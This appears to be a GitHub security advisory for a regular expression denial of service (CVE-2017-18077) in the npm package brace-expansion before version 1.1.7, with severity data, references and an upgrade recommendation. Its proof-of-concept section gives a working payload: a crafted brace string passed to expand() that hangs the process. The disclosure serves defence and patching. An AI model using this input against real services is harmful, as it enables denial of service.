# [H] ReDoS in brace-expansion

## Summary
Severity: High
Advisory: GHSA-832h-xg76-4gv6
CVE: CVE-2017-18077
CWE: CWE-1333
Ecosystem: npm
CVSS: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2018-01-29
Source: https://github.com/advisories/GHSA-832h-xg76-4gv6
Type: github-advisory

## Affected
- npm: `brace-expansion` — affected >=0 <1.1.7

## Details
Affected versions of `brace-expansion` are vulnerable to a regular expression denial of service condition.

## Proof of Concept

```
var expand = require('brace-expansion');
expand('{,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\n}');
```


## Recommendation

Update to version 1.1.7 or later.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2017-18077
- https://github.com/juliangruber/brace-expansion/issues/33
- https://github.com/juliangruber/brace-expansion/pull/35
- https://github.com/juliangruber/brace-expansion/pull/35/commits/b13381281cead487cbdbfd6a69fb097ea5e456c3
- https://bugs.debian.org/862712
- https://github.com/advisories/GHSA-832h-xg76-4gv6
- https://github.com/juliangruber/brace-expansion
- https://www.npmjs.com/advisories/338
